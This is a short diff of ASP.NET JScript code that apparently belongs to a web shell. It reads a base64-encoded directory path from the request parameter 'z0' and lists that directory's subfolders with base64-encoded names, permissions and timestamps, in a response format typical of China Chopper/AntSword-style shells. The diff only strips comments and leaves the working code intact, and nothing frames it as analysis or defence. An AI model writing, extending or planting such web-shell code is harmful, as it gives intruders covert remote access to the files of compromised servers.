@@ -59,7 +59,6 @@ function fnPermission(info : System.IO.FileSystemInfo) : String {
     return p;
 }
 
-// Execution Entry Point
 var b64Dir : String = System.Web.HttpContext.Current.Request.Item["z0"];
 if (b64Dir == null || b64Dir == "") {
     Response.Write("ERROR://Missing directory parameter (z0)");
@@ -74,7 +73,6 @@ if (b64Dir == null || b64Dir == "") {
         var dirInfo : System.IO.DirectoryInfo = new System.IO.DirectoryInfo(szDir);
         var aResult : System.Text.StringBuilder = new System.Text.StringBuilder();
 
-        // Declare loop variables here ONCE to avoid "already defined" errors
         var szb64Name : String = "";
         var szPerm : String = "";
         var nLength : long = 0;
@@ -82,12 +80,10 @@ if (b64Dir == null || b64Dir == "") {
         var mtime : String = "";
         var atime : String = "";
 
-        // Process Subdirectories
         var subFolders : System.IO.DirectoryInfo[] = dirInfo.GetDirectories();
         for (var i = 0; i < subFolders.Length; i++) {
             var subFolder : System.IO.DirectoryInfo = subFolders[i];
             
-            // Re-assign variables (no 'var' keyword)
             szb64Name = Base64Encode("/" + subFolder.Name);
             szPerm = fnPermission(subFolder);
             nLength = 0;
